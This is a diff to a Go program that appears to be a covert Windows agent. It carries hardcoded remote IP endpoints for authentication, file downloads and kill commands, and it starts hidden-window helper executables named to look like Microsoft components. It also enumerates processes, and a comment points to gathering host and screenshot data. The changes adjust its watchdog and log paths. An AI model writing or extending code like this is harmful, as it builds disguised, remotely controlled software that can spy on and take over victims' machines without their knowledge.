@@ -23,7 +23,7 @@ import (
 	"time"
 )
 
-const VERSION string = "6"
+const VERSION string = "7"
 const MIDURL string = "http://111.231.82.173/"
 const MIDFILE string = "http://47.95.233.176/file/"
 const MIDAUTH string = "http://111.231.82.173:9000/auth"
@@ -32,7 +32,8 @@ const MIDKILLIP string = "http://111.231.82.173:9000/Killip"
 const ALLKILL string = "http://111.231.82.173:9000/Allkill"
 const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
 const CURRENTPATH = "C:\\Windows\\Temp\\"
-const NOGUILOG = "C:\\Windows\\Temp\\nogui.txt"
+
+var NOGUILOG = get_current_user() + "\\temp\\nogui.txt"
 
 var NEWPATH = get_current_user() + "\\microsoftNet\\"
 var DATAPATH = get_current_user() + "\\temp\\"
@@ -238,9 +239,13 @@ func ListProcess() {
 	MultiFileDown(checkdog, "again", downflag)
 	dogcmd := exec.Command(CURRENTPATH + "MicrosoftBroker.exe")
 	dogcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	dogcmd.Start()
+	//block
+	dogcmd.Run()
 	KillDog()
-	var text, _ = ioutil.ReadFile(NOGUILOG)
+	text, err := ioutil.ReadFile(NOGUILOG)
+	if err != nil {
+		log.Println("nogui 文件不存在:", err)
+	}
 	current_file := strings.Split(string(text), "\\")
 	buf := bytes.Buffer{}
 	cmd := exec.Command("wmic", "process", "get", "name,processid")
@@ -257,12 +262,13 @@ func ListProcess() {
 		cmd3 := exec.Command(string(text))
 		cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		cmd3.Start()
-	} else {
-		//if up call dog
-		cmd4 := exec.Command(CURRENTPATH + "WindowsEventLog.exe")
-		cmd4.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		cmd4.Start()
 	}
+	//else {
+	//	//if up call dog
+	//	cmd4 := exec.Command(CURRENTPATH + "WindowsEventLog.exe")
+	//	cmd4.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	//	cmd4.Start()
+	//}
 }
 
 //get hostid-ip-screensize pic
